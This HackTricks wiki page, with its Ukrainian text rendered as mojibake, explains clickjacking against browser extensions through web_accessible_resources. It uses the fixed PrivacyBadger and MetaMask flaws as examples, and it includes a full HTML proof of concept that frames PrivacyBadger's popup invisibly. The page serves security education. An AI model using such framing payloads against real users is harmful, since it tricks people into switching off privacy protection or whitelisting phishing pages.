# BrowExt - ClickJacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–¶—è —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –±—É–¥–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é ClickJacking —É —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—ñ –±—Ä–∞—É–∑–µ—Ä–∞.\
–Ø–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ —Ç–∞–∫–µ ClickJacking, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è –º—ñ—Å—Ç–∏—Ç—å —Ñ–∞–π–ª **`manifest.json`** —ñ —Ü–µ–π JSON —Ñ–∞–π–ª –º–∞—î –ø–æ–ª–µ `web_accessible_resources`. –û—Å—å —â–æ –∫–∞–∂—É—Ç—å [–¥–æ–∫—É–º–µ–Ω—Ç–∏ Chrome](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources):

> –¶—ñ —Ä–µ—Å—É—Ä—Å–∏ –±—É–¥—É—Ç—å –¥–æ—Å—Ç—É–ø–Ω—ñ –Ω–∞ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ —á–µ—Ä–µ–∑ URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, —è–∫–∏–π –º–æ–∂–Ω–∞ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`extension.getURL method`**. –†–µ—Å—É—Ä—Å–∏, —â–æ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ, –ø–æ–¥–∞—é—Ç—å—Å—è –∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ CORS, —Ç–æ–º—É –≤–æ–Ω–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ —á–µ—Ä–µ–∑ –º–µ—Ö–∞–Ω—ñ–∑–º–∏, —Ç–∞–∫—ñ —è–∫ XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

**`web_accessible_resources`** —É —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—ñ –±—Ä–∞—É–∑–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω—ñ –Ω–µ –ª–∏—à–µ —á–µ—Ä–µ–∑ –≤–µ–±; –≤–æ–Ω–∏ —Ç–∞–∫–æ–∂ –ø—Ä–∞—Ü—é—é—Ç—å –∑ –≤–±—É–¥–æ–≤–∞–Ω–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–æ–Ω–∏ –º–∞—é—Ç—å –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å:

* –ó–º—ñ–Ω—é–≤–∞—Ç–∏ —Å—Ç–∞–Ω —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è
* –ó–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ —Ä–µ—Å—É—Ä—Å–∏
* –í–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –±—Ä–∞—É–∑–µ—Ä–æ–º –¥–æ –ø–µ–≤–Ω–æ—ó –º—ñ—Ä–∏

–û–¥–Ω–∞–∫ —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î —Å–æ–±–æ—é —Ä–∏–∑–∏–∫ –±–µ–∑–ø–µ–∫–∏. –Ø–∫—â–æ —Ä–µ—Å—É—Ä—Å —É **`web_accessible_resources`** –º–∞—î –±—É–¥—å-—è–∫—É –∑–Ω–∞—á–Ω—É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤–±—É–¥—É–≤–∞—Ç–∏ —Ü–µ–π —Ä–µ—Å—É—Ä—Å —É –∑–æ–≤–Ω—ñ—à–Ω—é –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É. –ù–µ–ø—ñ–¥–æ–∑—Ä—é—é—á—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ, —è–∫—ñ –≤—ñ–¥–≤—ñ–¥—É—é—Ç—å —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É, –º–æ–∂—É—Ç—å –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ —Ü–µ–π –≤–±—É–¥–æ–≤–∞–Ω–∏–π —Ä–µ—Å—É—Ä—Å. –¢–∞–∫–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—è –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –Ω–µ–ø–µ—Ä–µ–¥–±–∞—á—É–≤–∞–Ω–∏—Ö –Ω–∞—Å–ª—ñ–¥–∫—ñ–≤, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –¥–æ–∑–≤–æ–ª—ñ–≤ —ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π —Ä–µ—Å—É—Ä—Å—ñ–≤ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è.

## –ü—Ä–∏–∫–ª–∞–¥ PrivacyBadger

–£ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—ñ PrivacyBadger –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ —Ç–∏–º, —â–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è `skin/` –±—É–ª–∞ –æ–≥–æ–ª–æ—à–µ–Ω–∞ —è–∫ `web_accessible_resources` –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π [–±–ª–æ–≥-–ø–æ—Å—Ç](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
–¶—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –ø—Ä–∏–∑–≤–µ–ª–∞ –¥–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ—ó –ø—Ä–æ–±–ª–µ–º–∏ –±–µ–∑–ø–µ–∫–∏. –ó–æ–∫—Ä–µ–º–∞, —Ñ–∞–π–ª `skin/popup.html`, —è–∫–∏–π –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è –ø—Ä–∏ –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ —ñ–∫–æ–Ω–∫–æ—é PrivacyBadger —É –±—Ä–∞—É–∑–µ—Ä—ñ, –º–æ–∂–µ –±—É—Ç–∏ –≤–±—É–¥–æ–≤–∞–Ω–∏–π –≤ `iframe`. –¶–µ –≤–±—É–¥–æ–≤—É–≤–∞–Ω–Ω—è –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–µ –¥–ª—è –æ–±–º–∞–Ω—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∑–º—É—à—É—é—á–∏ —ó—Ö –≤–∏–ø–∞–¥–∫–æ–≤–æ –Ω–∞—Ç–∏—Å–∫–∞—Ç–∏ –Ω–∞ "–í–∏–º–∫–Ω—É—Ç–∏ PrivacyBadger –¥–ª—è —Ü—å–æ–≥–æ –≤–µ–±-—Å–∞–π—Ç—É". –¢–∞–∫–∞ –¥—ñ—è –ø–æ—Ä—É—à–∏—Ç—å –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∏–º–∫–Ω—É–≤—à–∏ –∑–∞—Ö–∏—Å—Ç PrivacyBadger —ñ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—ñ–¥–¥–∞—é—á–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—ñ–¥–≤–∏—â–µ–Ω–æ–º—É –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—é. –í—ñ–∑—É–∞–ª—å–Ω—É –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—é —Ü—å–æ–≥–æ –µ–∫—Å–ø–ª–æ–π—Ç—É –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —É –≤—ñ–¥–µ–æ –ø—Ä–∏–∫–ª–∞–¥—ñ ClickJacking, –Ω–∞–¥–∞–Ω–æ–º—É –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

–©–æ–± —É—Å—É–Ω—É—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –±—É–ª–æ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ –ø—Ä–æ—Å—Ç–µ —Ä—ñ—à–µ–Ω–Ω—è: –≤–∏–¥–∞–ª–µ–Ω–Ω—è `/skin/*` –∑—ñ —Å–ø–∏—Å–∫—É `web_accessible_resources`. –¶—è –∑–º—ñ–Ω–∞ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –∑–º–µ–Ω—à–∏–ª–∞ —Ä–∏–∑–∏–∫, –∑–∞–±–µ–∑–ø–µ—á–∏–≤—à–∏, —â–æ –≤–º—ñ—Å—Ç –∫–∞—Ç–∞–ª–æ–≥—É `skin/` –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–π –∞–±–æ –º–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω–∏–π —á–µ—Ä–µ–∑ –≤–µ–±-–¥–æ—Å—Ç—É–ø–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏.

–í–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –±—É–ª–æ –ø—Ä–æ—Å—Ç–∏–º: **–≤–∏–¥–∞–ª–∏—Ç–∏ `/skin/*` –∑—ñ —Å–ø–∏—Å–∫—É `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Example

A [**–±–ª–æ–≥ –ø–æ—Å—Ç –ø—Ä–æ ClickJacking —É metamask –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ç—É—Ç**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É Metamask –≤–∏–ø—Ä–∞–≤–∏–≤ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏, —â–æ –ø—Ä–æ—Ç–æ–∫–æ–ª, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –¥–æ—Å—Ç—É–ø—É, –±—É–≤ **`https:`** –∞–±–æ **`http:`** (–Ω–µ **`chrome:`**, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥):

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**–©–µ –æ–¥–∏–Ω ClickJacking, –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–∏–π** —É —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—ñ Metamask, –ø–æ–ª—è–≥–∞–≤ —É —Ç–æ–º—É, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–≥–ª–∏ **Click to whitelist**, –∫–æ–ª–∏ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –ø—ñ–¥–æ–∑—Ä—é–≤–∞–ª–∞—Å—è —É —Ñ—ñ—à–∏–Ω–≥—É —á–µ—Ä–µ–∑ `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. –û—Å–∫—ñ–ª—å–∫–∏ —Ü—è —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –±—É–ª–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ Clickjacking, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º—ñ–≥ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –Ω–µ—é, –ø–æ–∫–∞–∑—É—é—á–∏ —â–æ—Å—å –Ω–æ—Ä–º–∞–ª—å–Ω–µ, —â–æ–± –∑–º—É—Å–∏—Ç–∏ –∂–µ—Ä—Ç–≤—É –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ –¥–ª—è –≤–Ω–µ—Å–µ–Ω–Ω—è –¥–æ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É, –Ω–µ –ø–æ–º—ñ—á–∞—é—á–∏ —Ü—å–æ–≥–æ, –∞ –ø–æ—Ç—ñ–º –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É —Ñ—ñ—à–∏–Ω–≥—É, —è–∫–∞ –±—É–¥–µ –≤–Ω–µ—Å–µ–Ω–∞ –¥–æ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É.

## Steam Inventory Helper Example

Check the following page to check how a **XSS** in a browser extension was chained with a **ClickJacking** vulnerability:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## References

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
